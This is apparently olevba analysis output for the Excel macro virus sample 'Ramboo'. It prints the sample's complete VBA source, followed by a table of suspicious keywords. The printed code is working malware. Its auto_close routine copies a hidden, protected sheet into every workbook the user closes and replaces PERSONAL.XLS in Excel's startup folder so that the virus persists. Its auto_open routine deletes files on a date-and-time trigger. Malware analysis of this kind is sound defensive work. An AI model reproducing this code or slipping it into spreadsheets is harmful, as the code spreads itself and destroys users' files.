olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RAMBOO.bas 
in file: Virus.MSExcel.Ramboo-5c5a508f1525bd204d0015754c485476a0453727 - OLE stream: '_VBA_PROJECT_CUR/VBA/RAMBOO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
T = TimeValue(Time)
X$ = Str(T)
M$ = Left(X$, 2)
If M$ = "13" Or M$ = "6:" Or M$ = "06" Then
I = Date
P$ = Str(I)
P1$ = Left(P$, 2)
If P1$ = "23" Then
Kill "J*.*"
Else
End If
Else
End If
End Sub

Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
H$ = ActiveWorkbook.Name
P$ = ActiveWorkbook.Path
S$ = Workbooks(H$).Sheets(1).Name
If S$ <> "RAMBOO" Then
Workbooks("PERSONAL.XLS").Sheets("RAMBOO").Copy BEFORE:=Workbooks(H$).Sheets(1)
Workbooks(H$).Sheets("RAMBOO").Protect DrawingObjects:=True, Contents:=True, Scenarios _
        :=True
Workbooks(H$).Sheets("RAMBOO").Visible = False
Else
End If
ST$ = Application.StartupPath
PE$ = Dir(ST$ & "\" & "PERSONAL.XLS")
If PE$ = "PERSONAL.XLS" Then
C = 1
Else
C = 0
End If

If C = 1 Then
N$ = ActiveWorkbook.Name
S$ = Workbooks("PERSONAL.XLS").Sheets(1).Name
If S$ <> "RAMBOO" Then
'SAVE AS------
Windows("PERSONAL.XLS").Visible = True
ActiveWorkbook.Close
Kill ST$ & "\" & "PERSONAL.XLS"
C = 0
'--------------
Else
End If
Else
End If

'SAVE AS NEW------
If C = 0 Then
N$ = ActiveWorkbook.Name
Sheets("RAMBOO").Visible = True
Sheets("RAMBOO").Select
CUR$ = CurDir()
With ActiveWorkbook
        .Title = ""
       .Subject = ""
       .Author = ""
       .Keywords = ""
      .Comments = ""
  End With
N1$ = ActiveWorkbook.Name
ChDir Application.StartupPath
ActiveWindow.Visible = False

Workbooks(N1$).SaveAs FileName:=Application.StartupPath & "\" & "PERSONAL.XLS", FileFormat:=xlNormal, _
        Password:="", WriteResPassword:="", ReadOnlyRecommended:=False _
        , CreateBackup:=False
Workbooks("PERSONAL.XLS").Sheets("RAMBOO").Protect DrawingObjects:=True, Contents:=True, Scenarios _
        :=True
        ChDir CUR$

'--------------
Else
End If
Application.OnSheetActivate = "PERSONAL.XLS!RAMBOO"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  RAMBO
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

